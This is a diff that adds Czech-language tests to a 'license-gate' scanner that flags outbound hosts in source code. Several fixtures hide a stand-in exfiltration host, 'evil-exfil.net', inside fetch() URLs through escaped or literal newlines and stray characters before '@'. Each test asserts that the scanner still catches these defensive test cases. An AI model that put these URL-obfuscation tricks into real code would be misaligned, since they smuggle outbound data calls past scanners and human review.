@@ -584,6 +584,81 @@ describe('license-gate: pokrytí (kontroly 3 a 5)', () => {
     expect(out).toContain('zpětné lomítko');
   });
 
+  it('konec řádku escapem před @ cíl neskryje — fetch ho z URL taky zahodí', () => {
+    const dir = makeGreenRepo();
+    write(dir, 'src/nl.ts', "await fetch('https://api.fixture-provider.io\\n@evil-exfil.net/v1');\n");
+
+    const { code, out } = run(LICENSE_GATE, dir);
+    expect(failedChecks(out)).toEqual([5]);
+    expect(out).toContain('autorita URL pokračuje');
+    expect(code).toBe(1);
+  });
+
+  it('konec řádku zapsaný unicode escapem cíl neskryje ani tak', () => {
+    const dir = makeGreenRepo();
+    // Unicode zápis konce řádku je totéž jako krátký escape, jen jinou cestou
+    // v dekodéru — a bez vlastního testu ta druhá cesta nebyla pokrytá.
+    write(dir, 'src/nlu.ts', "await fetch('https://api.fixture-provider.io\\u000A@evil-exfil.net/v1');\n");
+
+    expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([5]);
+  });
+
+  it('skutečný konec řádku v šablonovém literálu cíl neskryje', () => {
+    const dir = makeGreenRepo();
+    // Bez escapu, přímo zalomený řádek uvnitř zpětných apostrofů. `fetch` ho
+    // z URL zahodí stejně jako `\n`.
+    write(dir, 'src/tplnl.ts', 'export const u = `https://api.fixture-provider.io\n@evil-exfil.net/v1`;\n');
+
+    expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([5]);
+  });
+
+  it('znak mimo třídu před @ cíl taky neskryje', () => {
+    const dir = makeGreenRepo();
+    write(dir, 'src/dollar.ts', "await fetch('https://api.fixture-provider.io$@evil-exfil.net/v1');\n");
+
+    expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([5]);
+  });
+
+  it('šipková funkce s regulárním výrazem neoslepí kontrolu na host pod ní', () => {
+    const dir = makeGreenRepo();
+    // `=> /['"]/` se bez `>` v sadě četlo jako dělení, uvozovka uvnitř otevřela
+    // režim řetězce a host o řádek níž zmizel.
+    write(dir, 'src/arrow.ts', "export const q = (s: string) => /['\"]/.test(s);\nconst e = 'https://po-sipce.io/v1';\n");
+
+    const { code, out } = run(LICENSE_GATE, dir);
+    expect(failedChecks(out)).toEqual([5]);
+    expect(out).toContain('po-sipce.io');
+    expect(code).toBe(1);
+  });
+
+  it('věta s adresou uprostřed řetězce se za useknutou autoritu nepovažuje', () => {
+    const dir = makeGreenRepo();
+    // Skutečná mezera je mezera, ne escapem podstrčený neviditelný znak. Kdyby
+    // se to nerozlišilo, brána by hlásila každou takovou větu.
+    write(dir, 'src/prose.ts', "export const hint = 'viz https://api.fixture-provider.io a pak dál';\n");
+
+    expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([]);
+  });
+
+  it('lokální server s portem skládaným za běhu není nález', () => {
+    const dir = makeGreenRepo();
+    write(dir, 'src/dev.ts', 'export const ping = (p: number) => fetch(`http://127.0.0.1:${p}/health`);\n');
+    expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([]);
+
+    // A totéž bez cesty za portem — useknuté je v portu, ne v hostu.
+    write(dir, 'src/dev2.ts', 'export const base = (p: number) => `http://127.0.0.1:${p}`;\n');
+    expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([]);
+  });
+
+  it('cesta skládaná za běhu projde, host skládaný za běhu ne', () => {
+    const dir = makeGreenRepo();
+    write(dir, 'src/tpl.ts', 'export const u = (id: string) => `https://api.fixture-provider.io/v1/${id}`;\n');
+    expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([]);
+
+    write(dir, 'src/tpl2.ts', 'export const v = (h: string) => `https://api.fixture-provider.io${h}/v1`;\n');
+    expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([5]);
+  });
+
   it('soubor .mts se skenuje stejně jako .ts', () => {
     const dir = makeGreenRepo();
     write(dir, 'src/edge.mts', "await fetch('https://jen-v-mts.io/v1');\n");
